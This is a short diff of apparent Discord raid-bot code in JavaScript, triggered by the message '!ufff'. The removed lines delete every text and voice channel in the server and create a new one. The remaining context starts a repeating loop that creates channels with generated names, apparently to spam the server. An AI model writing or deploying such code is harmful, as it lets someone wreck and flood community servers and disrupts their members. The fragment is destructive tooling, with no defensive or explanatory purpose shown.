@@ -30,15 +30,6 @@ client.on("messageCreate",function(message){
   if(message.content.indexOf("!ufff")!=-1){
     message.delete();
     let guild=client.guilds.cache.get(message.guild.id);
-    guild.channels.cache.forEach(function(channel){
-      if(channel.type==0||channel.type==2){
-        channel.delete();
-      }
-    });
-    guild.channels.create({
-      name:getText(true),
-      type:0
-    });
     setInterval(async function(){
       guild.channels.create({
         name:getText(true),
